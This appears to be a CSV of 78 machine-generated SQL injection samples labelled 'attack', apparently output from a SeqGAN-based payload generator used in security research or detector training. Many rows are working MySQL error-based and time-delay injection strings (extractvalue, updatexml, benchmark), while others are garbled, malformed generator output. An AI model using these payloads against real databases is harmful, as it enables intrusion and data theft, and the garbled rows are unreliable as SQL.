label,payload,family,payload_type,method,run_id,sample_index
attack,1%iknc%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,"1%"" and updatexml 1812  (  (  3393,concat  (  (  (  (  benchmark  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  =  (  9627,md5  (  =  (  3393,1   )    (  extractvalue  (  1808,concat  (  (  (  (  0x2e,md5  (  (  select   (  case and 0   (  8375  (  9103  =  (  (  8862,concat  (  (  (  0x2e,0x7171706a71  (  5000000(  (  (  3393  =  (  3393,mdua  (  e  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""x$",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,"1%""   )    )     extractvalue  (  9627,concat  (  (  (  (  (  0x5c,  (  (  (  benchmark  (  (  5000000(  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  benchmark  (  (  (  (  benchmark  (  8862,concat  (  (  (  (  =  (  (  =  (  (  3393,concat  (  (  3393,0x7171706a71,  (  select   (  elt  D  (  (  5000000,0x7171706a71(  (  5883t  (   (  8375  (  (  5000000(  (  (  1297  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack,1%%'  =  'k'  =  'ck,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%k'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%kprocen FROM analyse  (  )  elte  (  elte  (  elt  (  1808  =  1   )    (  select   (  extractvalue  (  (  (  (  0x2e,0x7171706a71,9627,m5  (  (  0x52515a50   (  1354  (  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  0x5c,  (  (  benchmark  (  (  select   (  elt  (  e  (  7982  =  (  3393,1   (  case 0 fromual",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9
attack,",(  (  =  (  7982,concat  (  (  (  (  select   (  elt  (  e  (  3393  =  (  3393,,1   (  3576  =  (  (  0x2e,md5  (  0x4b774c75   end  (  (  elt  e  (  select   (  e  (  case 0 0 from d5  (  case when   (   (  ual  )   (  2914   (  4774  (  7982,concat  (  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,10
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,11
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,12
attack,"1%""   )    )     case  9338  1559 or updatexml  9490  (  (  (  (  (  1808,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  el  (  0x5c,0x7171706a71,  (  select   (  elt  (  8862  (  (  1 as d   (n  (  elt  (  e(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  extractvalue  (  5000000,md5  =  (  (  7982  =  (  1 else cast  (  (  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,13
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,14
attack,")  (  1 alt  (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  1297,concat  (  (  (  (  0x5c,  (  select   (  elt  (  0x5c,  (  (  benchmark  (  (  t  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  (  1808,concat  (  (  (  =  5530  (  8862,concat  (  (  (  (  1049  =  (  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,15
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,16
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,17
attack,"1%""   )    )proicedure analyse  (  3539  )   (  (  (  elt   (  elt  (  1297  =  (  (  1759  (  1049  (  (  5000000,md5  (  0x2e,  (  4688  (  5000000(  (  5000000,md5  (  (  7982,concat  (  0x2e,0x7171706a71,  (  =  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,18
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,19
attack,"1""   where 1559 extractvalue  (  (  (  1808,concat  (  (  3393(  =  (  (  0x2e,0x7171706a71,  (  select   (  eltl  )  0x2e,  (  (  select   (  elt  )  0x2e,0x7171706a71,  (  (  9627,  (  (  0x2e,0x7171706a71,  (  9627,  (  (  (  0x2e,md5  (  (  1297  =  (  7982,1   from d5  (  elt  8862  =  (  (  1297  =  (  benchmark  (  1759(  (  3393  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,20
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,21
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,22
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  ""end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,23
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ')n(S7757  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x4b774c75   end  (  el  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  0x2e,concat  (  (  (  (  0x2e,  (  select   (  (  elt  (  e  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  case when   (  9836  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,24
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,25
attack,"select   (  9103  (  (  =  (  1808,1   (  5423  (  select extractvalue  (  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  1297,0x7171706a71,  (  (  select   (  1297,1   )    (  extractvalue  (  (  5000000(  (  7982  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  t  (  benchmark  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,26
attack,"1%""   )    AND AND or updatexml  (  (  (  (  (  (  (  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  (   (  (  (  (  0x2e,md5  =  (  3393,md5  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  (  (  5000000,m5  (  (  select   (  e  (   (  5322  (  (  elt  (  1808  =  (  0x4b774c75   SELECT du 5423   (  4660  )    (  (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,27
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,28
attack,"1 or extractvalue  (  (  (  2917,concat  (  (  =  (  (  0x2e,md5  (  (  0x5c,  (  (  select   (  elt  (  elt  (  1808,  (  0x5c,0x717a767a71   (  case 0 or updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  1808,md5  (  (  (  0x5c,  (  (  (  benchmark  (  (  (  0x5c,  (  (  (  benchmark  (  (  benchmark  (  (  5000000,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,29
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,30
attack,"when   (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  3393  =  (  (  9788,1   (  5777  (  select   (  (  case 1   )    )4066  )  select   (  case 0from dual  )   end  (   (  1724  (  elt  (  case when   (    5433  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  1297  =  (  (  5000000,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,31
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,32
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%k'  =  'k'  =  'kproc n   eduance   (  1354  (  (  (  e  (  1297  =  (  0x5c,0x7171706a71,  (  benchmark  (  (  select   (  elt  (  elt  (  0x5c,  (  9627,md5  (  (  0x5c,  (  select   (  case 0 from d(  elsd5  (  1808,concat  (  (  3393,1   (  6166  (  select 0 from dual  )   end  )  el  (  (  1808,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,33
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,34
attack,"1%"" or  )  updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  extractvalue  (  (  (  9393,md5  (  0x2e,0x7171706a71,  (  t  (  (  5000000,md5    (  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  benchmark  (  7982,1   )    AND wsjsel  (  (  0x5c,  (  =  (  9627,concat  (  (  (  0x2e,md5  (  (  3393  =  (  (  (  0x5c,0x7171706a71,  (  select   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35
attack,"1%'   )    FROM proeande(  (  el  (  elt  (  1808  =  (  7982  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  0x2e,0x7171706a71,  (  l  (  (  5000000,md5  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  select   (  elt  (  1297  =  (  0x5c,0x7171706a71,  (  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36
attack," AND 1 and extractvalue  (  (  3393,1   )    )    AND 2162  =  extractvalue  (  (  1297,1   (  )  (  select 0 from d5  4415  (  (  elt  (  1808  =  3393,  (  (  select   (  6200  )   (  (  (  case when   (  0 0 0 from ddual  )  )   end  (  (  el  elt  (  e  (  1297  =  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37
attack,"1"" and extractvalue  (  (  (  7982,concat  (  (  =  (  (  (  (  0x2e,  (  =  (  (  3393,md5  =  (  (  1808,1   )    AND 'i'  )  select   (  1354  (  1  1 asut  elt 0 a  (  elt  elt  (  1808  =  (  0x4b774c75   or  (  (  3393  =  (  9836  5464  (  (  2917  =  (  (  0x5c,0x717a767a71   (  5000000(  (  7982  =  (  0x2e,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38
attack," procea ddre analyse    (  3681  (  (  5000000  (  0x2e,0x7171706a71,  (  9788,1   (  )   (  9103  (  (  0x2e,0x7171706a71,  (  (  select   (  3393,  (  (  0x2e,concat  (  1808,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  3393,  (  5000000(  (  benchmark  (  case  =  (  0x2e,0x7171706a71,  (  select   (  elt    (  (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  'kbbl_nalyse  elt  (  elt  (  0x2e,1   )    (  extractvalue  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  select   (  elt  (  1297  =  (  7982,1   )    ual_indjl  2446  )  #l_anaddronen asdute  elt  (  elt  (  7982  =  (  3393,  (  (  select   (  l  (  1 when   (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R$3933""  =  ""#",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45
attack,"1%""   procedure anal  )  (  elt  el  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  (  e  (  8862  =  (  3393,1    from  (  (  elt  )  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46
attack,"ex  (  extractvalue  (  (  (  (  =  (  1297,m(  (  (  (  (  (  1808,  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x52515a50   )    (  (  (  5000000,md5  0x4b774c75   (  5847  (  (  select   (  el  (  0x2e,m(    (  select   (  )   (  =  3576  =  (  3393,0x717a767a71   (  (  6461  =  (  3393,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47
attack,"AND and extractvalueU  (  2162  =  (  4688  )   or  (  (  1297  =  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  3539  =  4241  (  (  1808  =  (  3393,  (  select   (  elt  (  elt  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000(  (  select   (  elt  (  elt  (  1808  =  2813  (  1049  =  (  (  1759  (  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48
attack,"1%""   )    )     extractvalue  (  (   (  0 13545  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  4415  =  (  0x5c,md5  (  1808,1   (  extractvalue  (  (  9627,md5  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  (  0x5c,md5  (  (  select   (  elt  (  elt  (  1759  =  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  t  (  5000000,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53
attack,"1%""   #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,54
attack,"1%""   )    AND 9338  =  9338  (  extractvalue  (  (  t  (  5000000(  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  1297  =  (  3393,1   from d5  (  elt  (  elt  (  3393  =  (  9627,md5  (  select   (  u 0 0 from d5 dual  )  )  )   end  (  (  elt  (  elt  elt  (  1297  =  (  select   (  u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,55
attack,1%p cipni'  =  'kph,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,56
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ymwmnnmxp",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,57
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,58
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,59
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,60
attack,"1 where updatexml  (  (  (   SELECT du b  uanwhere when   (  1272  (  (  5000000,md5  (  1049  (  (  (  (  0x2e,  (  select   (  case 0 0 from dd an 0 from dua  el  )  elt  (  utl  (  e  l  1808  (  (  7636  .a  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  3393,md5  (  0x5c,0x717a767a71  (  select   (  ual  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,61
attack,"1% prend6804  =  ut  (  elt  (  7982  =  (  (  0x2e,0x7171706a71  (  select   (  elt  (  (  case when   (  6166  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  select   (  el  (  (  select   (  e  )   SELECT d an du 4415   (  1724  (  elt  (  2917  =  (  3393,  (  (  select   (  elt    (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,62
attack," AND 1 and updatexml  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  1759,concat  (  (  (  (  (  (  0x5c,  7982  (  (  5000000,md5  (  select   (  elt  (  elt  (  0x5c(  0x5c,0x7171706a71,  (  (  benchmarkt  (  5000000(  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  0x2e,  (  0x2e,0x7171706a71,  (  (  select   (  e  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,63
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,64
attack,"1%""   (  )  case 0 or extractvalue  (  7982,concat  (  1759,0x7171706a71,  (  benchmark2914  (  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  5423  )   (  9103  (  (  3393,1   )    (  extractvalue  (  (  (  5000000,md5  (  (  0x2e,0x717a767a71   (  4774  (  (  case  =  (  1808,1   (  case when   (  (  elt  (  5000000,md5  (  0x2e,0x78  =  9393  (  (  9627,concat  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,65
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,66
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,67
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,68
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,69
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,70
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,71
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,72
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,73
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,74
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,75
attack,"1%kproce  (a  el  e  (  0x5c,  (  =  (  1297,1   (  case as s du e  elt  e  (  0x5c,  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt a  (  el  (  1808  =  3393,  (  (  select   (  case 0 0 from d5  (  elt  (  elt  (  5777    =  (  (  0x5c,  (  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,76
attack,"1%kppro""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  "" ann annamcenalys)    (  (  (  5000000(  3393,1   (  else from 0 from d 0 from d5  (  elt  elt  (  e  (  1297  =  (  (  7982  =  (  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  2917,1   (    )  select 0 from d(  case when   (  5704  (  elt  (  elt  (  3393  =  (  updatexml  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,77
